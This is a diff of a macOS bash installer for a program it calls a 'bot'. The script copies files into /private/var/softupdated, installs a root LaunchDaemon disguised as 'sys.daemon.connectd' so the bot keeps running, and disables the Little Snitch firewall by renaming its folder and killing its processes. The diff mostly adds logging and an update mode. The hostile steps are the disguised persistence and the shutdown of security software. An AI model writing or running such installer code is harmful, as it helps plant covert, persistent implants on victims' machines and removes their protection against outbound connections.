@@ -1,51 +1,74 @@
 #!/bin/bash
 
-echo [+] STARTED: `date`
+echo Starting
+
+mkdir -p /private/var/softupdated
+
+echo [+] Starting: `date` >> /private/var/softupdated/update.log 2>&1
 
 DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
-cd "$DIR"
+cd "$DIR" >> /private/var/softupdated/update.log 2>&1
 
-### unload previous install
-pid=`ps -ax | grep bot.py | head -1 | awk '{ print $1 }'`
-kill -KILL $pid > /dev/null 2>&1
+if [[ "$1" == "update" ]]
+	then
+	echo [+] Skipping bot unload. >> /private/var/softupdated/update.log 2>&1
+else
+	### unload previous install
+	echo [+] Unloading Bot... >> /private/var/softupdated/update.log 2>&1
 
-launchctl unload -w /Library/LaunchDaemons/sys.daemon.connectd.plist && echo [X] Unloaded Bot.
+	pid=`ps -ax | grep bot.py | head -1 | awk '{ print $1 }'`
+	kill -KILL $pid > /dev/null 2>&1
 
-pid=`ps -ax | grep bot.py | head -1 | awk '{ print $1 }'`
-kill -KILL $pid > /dev/null 2>&1
+	launchctl unload -w /Library/LaunchDaemons/sys.daemon.connectd.plist && echo [X] Unloaded Bot. >> /private/var/softupdated/update.log 2>&1
+
+	pid=`ps -ax | grep bot.py | head -1 | awk '{ print $1 }'`
+	kill -KILL $pid > /dev/null 2>&1
+fi
 
 ### copy libraries and binaries to corresponding locations
-mkdir -p /private/var/softupdated
-cp -fR ./* /private/var/softupdated/
-chmod -R +x /private/var/softupdated
+echo [+] Copying Files... >> /private/var/softupdated/update.log 2>&1
+mkdir -p /private/var/softupdated >> /private/var/softupdated/update.log 2>&1
+cp -fR ./* /private/var/softupdated/ >> /private/var/softupdated/update.log 2>&1
+chmod -R +x /private/var/softupdated >> /private/var/softupdated/update.log 2>&1
 
-rm -f /private/var/softupdated/README.md
-rm -Rf /private/var/softupdated/applet.rsrc
-rm -f /private/var/softupdated/*.icns
-rm -f /private/var/softupdated/*.sublime*
-rm -f /private/var/softupdated/description.rtfd
+rm -f /private/var/softupdated/README.md >> /private/var/softupdated/update.log 2>&1
+rm -Rf /private/var/softupdated/applet.rsrc >> /private/var/softupdated/update.log 2>&1
+rm -f /private/var/softupdated/*.icns >> /private/var/softupdated/update.log 2>&1
+rm -f /private/var/softupdated/*.sublime* >> /private/var/softupdated/update.log 2>&1
+rm -Rf /private/var/softupdated/description.rtfd >> /private/var/softupdated/update.log 2>&1
 
+echo [+] Files Copied. >> /private/var/softupdated/update.log 2>&1
+echo Copied 1/2
 ### Disable little snitch
 if [ -e "/Library/Little Snitch" ] 
 	then
-	mv "/Library/Little Snitch" "/Library/Little Snitch Monitor"
-	killall "Little Snitch Agent"
-	killall "Little Snitch Daemon"
-	killall "Little Snitch Network Monitor"
+	echo [+] Disabling Little Snitch... >> /private/var/softupdated/update.log 2>&1
+	mv "/Library/Little Snitch" "/Library/Little Snitch Monitor" >> /private/var/softupdated/update.log 2>&1
+	killall "Little Snitch Agent" >> /private/var/softupdated/update.log 2>&1
+	killall "Little Snitch Daemon" >> /private/var/softupdated/update.log 2>&1
+	killall "Little Snitch Network Monitor" >> /private/var/softupdated/update.log 2>&1
 fi
 
 ### copy launchd scripts to launchd folder
-cp -f ./sys.daemon.connectd.plist /Library/LaunchDaemons/sys.daemon.connectd.plist
-chown -R root /Library/LaunchDaemons/sys.daemon.connectd.plist
-chmod -R 644 /Library/LaunchDaemons/sys.daemon.connectd.plist
+echo [+] Copying Launch Scripts... >> /private/var/softupdated/update.log 2>&1
 
+cp -f ./sys.daemon.connectd.plist /Library/LaunchDaemons/sys.daemon.connectd.plist >> /private/var/softupdated/update.log 2>&1
+chown -R root /Library/LaunchDaemons/sys.daemon.connectd.plist >> /private/var/softupdated/update.log 2>&1
+chmod -R 644 /Library/LaunchDaemons/sys.daemon.connectd.plist >> /private/var/softupdated/update.log 2>&1
+chmod -R 700 /private/var/softupdated >> /private/var/softupdated/update.log 2>&1
+
+echo [+] Launch Scripts Copied. >> /private/var/softupdated/update.log 2>&1
+echo Copied 2/2
 ### For in-place updates
-rm -Rf /private/var/softupdated/code && echo "[+] Removed downloaded source folder."
-chmod -R 700 /private/var/softupdated
-
-### load launchd keepalive processes
-launchctl load -w /Library/LaunchDaemons/sys.daemon.connectd.plist && echo [√] Loaded Bot.
-
-echo [+] FINISHED: `date`
+if [ "$1" == "update" ]
+	then
+	rm -Rf /private/var/softupdated/code && echo "[+] Removed downloaded source folder." >> /private/var/softupdated/update.log 2>&1
+else
+	### load launchd keepalive processes
+	echo [+] Loading Bot... >> /private/var/softupdated/update.log 2>&1
+	launchctl load -w /Library/LaunchDaemons/sys.daemon.connectd.plist && echo [√] Loaded Bot. >> /private/var/softupdated/update.log 2>&1
+fi
+echo [+] FINISHED: `date` >> /private/var/softupdated/update.log 2>&1
+echo Finished
 
 exit 0
